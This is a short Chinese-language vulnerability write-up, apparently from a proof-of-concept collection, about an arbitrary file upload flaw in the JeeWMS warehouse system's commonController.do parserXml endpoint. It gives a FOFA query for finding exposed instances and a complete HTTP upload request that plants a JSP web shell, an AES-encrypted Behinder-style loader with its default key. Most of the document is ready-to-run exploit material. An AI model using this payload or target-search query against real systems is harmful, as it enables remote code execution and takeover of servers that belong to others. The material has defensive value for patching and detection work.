# JEEWMS系统commonController.do存在任意文件上传漏洞

JeeWMS是一款免费开源的仓库管理系统，支持3PL和厂内物流，涵盖订单管理，仓储管理，计费管理，现场作业，RFID，AGV等功能。本文介绍了系统的简介，功能，安装，截图和链接，适合仓储企业和开发者参考。JEEWMS系统commonController.do存在任意文件上传漏洞

## fofa

```javascript
body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
```

## poc

```javascript
POST /jeewms/commonController.do?parserXml HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Cookie: JSESSIONID=F571DC569F0A3DC553D8D25ACA42D570; JEECGINDEXSTYLE=ace; ZINDEXNUMBER=1990; Hm_lvt_a4980171086658b20eb2d9b523ae1b7b=1713256699,1713260101
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c
Content-Length: 792


------WebKitFormBoundaryHRhkXyQjTSAk8j8c
Content-Disposition: form-data; name="file"; filename="hai.jsp"
Content-Type: image/png

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
```

![输入图片说明](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502211354702.png)

![输入图片说明](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502211354338.png)

## 漏洞来源

- [JEEWMS-commonController.do？存在用于文件上传的 ParserXML ·问题 #IBFTZ7 ·JeeWMS/JeeWMS - Gitee.com](https://gitee.com/erzhongxmu/JEEWMS/issues/IBFTZ7)